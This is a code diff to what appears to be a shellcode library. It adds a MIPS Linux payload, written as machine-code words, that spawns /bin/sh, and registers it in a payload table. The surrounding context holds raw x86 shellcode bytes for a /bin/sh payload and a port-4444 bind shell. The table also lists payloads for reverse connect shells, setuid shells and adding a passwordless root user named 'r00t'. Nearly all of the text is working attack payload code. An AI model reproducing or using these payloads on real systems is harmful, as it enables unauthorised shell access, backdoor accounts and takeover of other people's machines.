@@ -32,6 +32,12 @@ unsigned char x86_linux_binsh2[] =
    "\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b\x58\x99\x52"
    "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";
 
+int mips_linux_binsh[] = {
+	0x00842026, 0x24020fb7, 0x0000000c, 0x3c086e69, 0x3508622f, 0x3c090068,
+	0x3529732f, 0xafa80000, 0xafa90004, 0xafbd0008, 0xafa0000c, 0x03a02021,
+	0x23a50008, 0x00003021, 0x24020fab, 0x0000000c, 0x00000000, 0x00000000,
+	0x00000000, 0x00000000, 0x00000000, 0x00000000 };
+
 unsigned char x86_linux_bind4444[] =
    "\x33\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x81\x9c\x95"
    "\xe9\x83\xeb\xfc\xe2\xf4\xb0\x47\xc6\xaa\xd2\xf6\x97\x83\xe7\xc4\x0c\x60"
@@ -455,6 +461,7 @@ struct shellcode_t shellcodes[] = {
  ENTRY(0,0,0,"arm.linux.suidsh",      arm_linux_suidsh,         "Setuid and runs /bin/sh" )
  ENTRY(0,0,0,"arm.linux.bind",        arm_linux_bind,           "Binds /bin/sh to a tcp port" )
  ENTRY(0,0,30,"armle.osx.reverse",    armle_osx_reverse,        "iPhone reverse connect shell to HOST and PORT" )
+ ENTRY(0,0,0,"mips.linux.binsh",      mips_linux_binsh,         "Runs /bin/sh (tested on loongson2f)." )
  ENTRY(0,0,0,"ppc.osx.adduser",       ppc_osx_adduser,          "Adds a root user named 'r00t' with no pass." )
  ENTRY(0,0,0,"ppc.osx.binsh",         ppc_osx_binsh,            "Executes /bin/sh" )
  ENTRY(0,0,0,"ppc.osx.binsh0",        ppc_osx_binsh0,           "Executes /bin/sh (with zeroes)" )
